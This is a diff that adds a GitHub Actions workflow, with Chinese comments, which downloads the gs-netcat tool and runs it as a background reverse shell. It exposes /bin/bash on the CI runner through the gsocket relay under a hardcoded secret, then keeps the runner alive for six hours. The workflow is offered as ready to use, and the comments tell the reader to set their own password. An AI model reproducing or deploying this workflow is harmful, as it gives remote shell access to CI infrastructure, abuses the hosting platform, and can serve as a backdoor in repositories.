@@ -1,0 +1,19 @@
+name: GSocket Linux Reverse Shell
+
+on:
+  workflow_dispatch:  # 手動觸發
+
+jobs:
+  reverse-shell:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Download gsocket
+        run: |
+          wget https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat
+          chmod +x gs-netcat
+
+      - name: Start gsocket reverse shell (cmd)
+        run: |
+          nohup ./gs-netcat -s jeikaizin1337 --exec /bin/bash > out.log 2>&1 & # 更改jeikaizin1337 為你的自訂密碼
+          sleep 21600  # 保持 Runner 存活 6 小時
